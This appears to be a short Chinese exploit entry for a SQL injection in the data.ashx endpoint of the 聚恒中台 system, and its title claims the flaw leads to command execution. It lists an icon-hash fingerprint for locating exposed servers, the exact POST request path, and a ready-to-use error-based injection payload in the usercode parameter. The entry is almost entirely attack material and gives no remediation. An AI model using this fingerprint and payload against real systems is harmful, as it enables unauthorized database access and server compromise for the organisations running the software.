# 聚恒网络技术有限公司聚恒中台系统data.ashxSQL注入致RCE漏洞

聚恒网络技术有限公司聚恒中台系统data.ashxSQL注入致 ｜ 命令执行 ｜ —
- **指纹**：`icon_hash="-2049533275"`
- **请求**：`POST /sysplat/dataget/data.ashx?type=sendvalidatecode HTTP/1.1`

**Payload**
```
usercode=1' and 1=(convert(int,@@version))--&&mobile=
```